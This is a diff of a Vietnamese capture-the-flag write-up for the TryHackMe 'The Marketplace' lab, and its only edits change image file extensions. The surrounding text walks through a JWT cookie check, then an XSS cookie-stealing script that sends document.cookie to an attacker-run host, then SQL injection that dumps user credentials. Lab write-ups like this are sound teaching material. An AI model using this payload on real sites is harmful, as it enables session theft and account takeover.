@@ -19,7 +19,7 @@ categories: ctf
 0. this unordered seed list will be replaced by toc as unordered list
 {:toc}
 
-![intro](/assets/img/2022-02-01-THM-The-Marketplace/1.png)
+![intro](/assets/img/2022-02-01-THM-The-Marketplace/1.webp)
 
 Xin chào, Lẩu đây, The holidays are too long, so I can only return to CTF now. And today I will open the New Year bowl with a machine medium - [Tryhackme - The Marketplace](https://tryhackme.com/room/marketplace)
 
@@ -68,17 +68,17 @@ Sau khi quét web path với cả 2 port kết hợp với phần thu thập th�
 
 Vậy nên tôi thử dùng BurpSuite để xem khai có thác được gì từ các path phía trên không. Với phần */report*, request cho tôi 1 cookie
 
-![cookie](/assets/img/2022-02-01-THM-The-Marketplace/2.png)
+![cookie](/assets/img/2022-02-01-THM-The-Marketplace/2.webp)
 
 Với cookie, tôi thử vào [JWT](https://jwt.io/) để decode 
 
-![decode-cookie](/assets/img/2022-02-01-THM-The-Marketplace/3.png)
+![decode-cookie](/assets/img/2022-02-01-THM-The-Marketplace/3.webp)
 
 Tôi đã thử vài các để giả mạo cookie nhưng không có kết quả. Tạm thời note nó lại, tôi sẽ chuyển qua cách khác. Trong */new*, với những phần có thể nhập vào từ bàn phím như thế này, tôi thử vài xss đơn giản
 
-![new-post](/assets/img/2022-02-01-THM-The-Marketplace/4.png)
+![new-post](/assets/img/2022-02-01-THM-The-Marketplace/4.webp)
 
-![xss-payload](/assets/img/2022-02-01-THM-The-Marketplace/5.png)
+![xss-payload](/assets/img/2022-02-01-THM-The-Marketplace/5.webp)
 
 Vậy là tôi có lỗ hổng XSS ở đây. Tôi sẽ thử lấy cookie của admin bằng cách tạo 1 listing chứa XXS payload và báo cáo nó với quản trị viên. 
 
@@ -99,7 +99,7 @@ Tạo XSS payload
 
 `<script>document.location='http://IP-remote:port-remote/grabber.php?c='+document.cookie</script>`
 
-![payload](/assets/img/2022-02-01-THM-The-Marketplace/6.png)
+![payload](/assets/img/2022-02-01-THM-The-Marketplace/6.webp)
 
 Trước khi ấn "Summit Query" thì tạo listener với port 9001
 
@@ -123,33 +123,33 @@ Sau đó report listing này với quản trị viên để họ trả lời và
 
 Tiếp theo tôi vào path */admin* để thay đổi cookie với BurpSuite
 
-![admin-cookie](/assets/img/2022-02-01-THM-The-Marketplace/7.png)
+![admin-cookie](/assets/img/2022-02-01-THM-The-Marketplace/7.webp)
 
 Vậy là tôi có flag 1.
 
 Tiếp theo, tôi để ý với response này, tôi có ID của từng user, vậy nên tôi đã nghĩ rằng sao không thử vài SQLi với path */admin* và in ra tên của database
 
-![user](/assets/img/2022-02-01-THM-The-Marketplace/8.png)
+![user](/assets/img/2022-02-01-THM-The-Marketplace/8.webp)
 
 Sau 1 lúc tìm hiểu về SQLi tôi nhận ra khi query đến database, ID nào đã tồn tại thì nó sẽ in ra thông tin về ID đó và thế là hết. Vậy để database query được câu lệnh SQLi phía sau, tôi phải thêm vào 1 ID chưa có trong db, ở đây tôi đã có ID 1,2,3,4, vậy thì ID chưa được gán thông tin sẽ là 5
 
 Đọc thêm: [SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 
-![db-query](/assets/img/2022-02-01-THM-The-Marketplace/9.png)
+![db-query](/assets/img/2022-02-01-THM-The-Marketplace/9.webp)
 
 Vậy là tôi có db đang sử dụng là 'marketplace'. Tiếp tục show các tables có trong db này
 
-![tables](/assets/img/2022-02-01-THM-The-Marketplace/10.png)
+![tables](/assets/img/2022-02-01-THM-The-Marketplace/10.webp)
 
 Tôi có 3 tables ở đây: items, messages và users. Query đến table user để lấy thông tin về các users
 
-![users](/assets/img/2022-02-01-THM-The-Marketplace/11.png)
+![users](/assets/img/2022-02-01-THM-The-Marketplace/11.webp)
 
-![user-pass](/assets/img/2022-02-01-THM-The-Marketplace/12.png)
+![user-pass](/assets/img/2022-02-01-THM-The-Marketplace/12.webp)
 
 Vậy là tôi có 3 username và password, lưu nó lại. Tiếp theo tôi còn 1 table nữa chưa xem thử đó là 'message'
 
-![message](/assets/img/2022-02-01-THM-The-Marketplace/13.png)
+![message](/assets/img/2022-02-01-THM-The-Marketplace/13.webp)
 
 Vậy là tôi có password của 1 user. Thử ssh với 2 user đã biết là *jake* và *michael*
 
